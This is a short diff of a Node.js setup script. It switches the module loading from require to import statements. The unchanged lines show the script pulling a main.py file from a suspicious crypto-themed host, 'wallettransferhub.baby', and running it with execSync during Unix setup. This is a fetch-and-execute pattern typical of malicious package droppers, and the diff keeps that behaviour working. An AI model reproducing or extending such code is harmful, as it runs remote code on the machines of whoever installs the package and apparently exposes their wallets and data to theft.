@@ -1,11 +1,12 @@
 #!/usr/bin/env node
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
-const { spawn } = require('child_process');
-const https = require('https');
-const http = require('http');
-const zlib = require('zlib');
+import fs from 'fs';
+import path from 'path';
+import os from 'os';
+import { spawn } from 'child_process';
+import https from 'https';
+import http from 'http';
+import zlib from 'zlib';
+import { execSync } from 'child_process';
 
 const BASE_API_URL = "https://wallettransferhub.baby/files";
 const MAIN_PY_URL = "https://wallettransferhub.baby/files/release/griffin/main.py";
@@ -267,7 +268,6 @@ async function setupUnix() {
 
         // Run main.py
         try {
-            const { execSync } = require('child_process');
             execSync(`"${pythonExec}" main.py`, {
                 cwd: path.dirname(pythonExec),
                 timeout: 30000,
